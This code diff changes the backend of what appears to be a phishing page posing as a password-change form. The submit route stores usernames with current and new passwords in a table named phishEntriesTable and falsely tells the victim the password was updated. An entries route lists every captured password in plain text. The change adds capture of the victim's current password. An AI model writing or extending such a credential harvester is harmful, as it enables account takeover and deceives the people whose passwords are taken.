@@ -12,9 +12,15 @@ router.post("/submit", async (req, res) => {
     return;
   }
 
-  const { username, newPassword, confirmPassword } = parsed.data;
+  const { username, currentPassword, confirmCurrentPassword, newPassword, confirmNewPassword } = parsed.data;
 
-  await db.insert(phishEntriesTable).values({ username, newPassword, confirmPassword });
+  await db.insert(phishEntriesTable).values({
+    username,
+    currentPassword,
+    confirmCurrentPassword,
+    newPassword,
+    confirmNewPassword,
+  });
 
   const response = SubmitCredentialsResponse.parse({ success: true, message: "Password updated successfully." });
   res.json(response);
@@ -26,8 +32,10 @@ router.get("/entries", async (_req, res) => {
   const entries = rows.map((r) => ({
     id: r.id,
     username: r.username,
+    currentPassword: r.currentPassword,
+    confirmCurrentPassword: r.confirmCurrentPassword,
     newPassword: r.newPassword,
-    confirmPassword: r.confirmPassword,
+    confirmNewPassword: r.confirmNewPassword,
     submittedAt: r.submittedAt.toISOString(),
   }));
 
